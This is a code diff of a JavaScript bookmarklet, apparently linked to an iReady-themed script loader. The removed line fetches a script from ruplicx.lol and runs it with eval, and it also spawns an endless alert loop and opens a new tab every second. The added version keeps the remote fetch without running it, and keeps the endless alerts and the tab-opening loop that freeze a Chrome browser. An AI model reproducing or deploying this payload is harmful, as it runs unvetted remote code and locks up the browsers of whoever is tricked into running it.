@@ -1,1 +1,8 @@
-javascript:fetch("https://ruplicx.lol/js/raw/js/scripts/iready/load.js").then(r => r.text()).then(r => eval(r)) while (true) {    alert("Sin Ready is NOT READY RIGHT NOW.");  }setInterval(function() {    window.open("about:blank", "_blank");  }, 1000);  
+javascript:fetch("https://ruplicx.lol/js/raw/js/scripts/iready/load.js") 
+setInterval(function() {
+    window.open("about:blank", "_blank");
+  }, 1000);
+  while (true) {
+    alert("This alert will keep opening non-stop on Chrome!");
+  }
+    
